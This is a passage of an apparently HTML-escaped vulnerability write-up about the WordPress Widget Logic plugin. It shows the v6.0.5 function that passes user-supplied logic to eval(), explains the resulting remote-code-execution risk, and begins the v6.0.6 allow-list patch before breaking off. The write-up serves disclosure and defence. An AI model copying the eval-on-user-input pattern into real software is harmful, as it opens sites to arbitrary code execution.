href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v6.0.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;widget_logic_check_logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;widget_logic_eval_override&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stristr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;return&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;return&amp;ensp;(&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;html_entity_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ENT_COMPAT&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ENT_HTML401&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ENT_QUOTES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;);&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;set_error_handler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;widget_logic_error_handler&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;phpcs:ignore&amp;ensp;--&amp;ensp;we&amp;ensp;have&amp;ensp;mode&amp;ensp;for&amp;ensp;debugging&amp;ensp;for&amp;ensp;admins&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$show_widget&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;@codingStandardsIgnoreLine&amp;ensp;-&amp;ensp;widget&amp;ensp;can&amp;#39;t&amp;ensp;work&amp;ensp;without&amp;ensp;eval&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Error&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trigger_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;E_USER_WARNING&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;@codingStandardsIgnoreLine&amp;ensp;-&amp;ensp;message&amp;ensp;is&amp;ensp;not&amp;ensp;dependent&amp;ensp;on&amp;ensp;user&amp;ensp;input&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$show_widget&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;restore_error_handler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$show_widget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;widget_logic_check_logic()&lt;/code&gt; function uses &lt;code&gt;eval()&lt;/code&gt; to directly execute the logic string provided by the user, without restricting which functions can be called. If the logic string does not contain the &lt;code&gt;return&lt;/code&gt; keyword, the function automatically wraps it into a &lt;code&gt;return(...)&lt;/code&gt; statement to ensure the expression is always valid when executed by &lt;code&gt;eval()&lt;/code&gt;. This mechanism allows users to enter simple conditional expressions, but it also turns every user input into complete PHP code, significantly increasing the risk of &lt;strong&gt;arbitrary code execution (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v6.0.6):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;widget_logic_check_logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allowed_functions&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_home&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_front_page&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_single&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_page&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_category&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_tag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_archive&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_search&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_404&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_user_logged_in&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;current_user_can&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_active_sidebar&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;is_admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allowed_functions&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;widget_logic_allowed_functions&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allowed_functions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Set&amp;ensp;up&amp;ensp;error&amp;ensp;handling&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;set_error_handler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;widget_logic_error_handler&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;E_WARNING&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;E_USER_WARNING&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;@codingStandardsIgnoreLine&amp;ensp;-&amp;ensp;we&amp;ensp;need&amp;ensp;this&amp;ensp;for&amp;ensp;error&amp;ensp;handling&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Tokenize&amp;ensp;the&amp;ensp;logic&amp;ensp;string&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tokens&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;widget_logic_tokenize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Parse&amp;ensp;and&amp;ensp;evaluate&amp;ensp;the&amp;ensp;expression&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$pos&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span 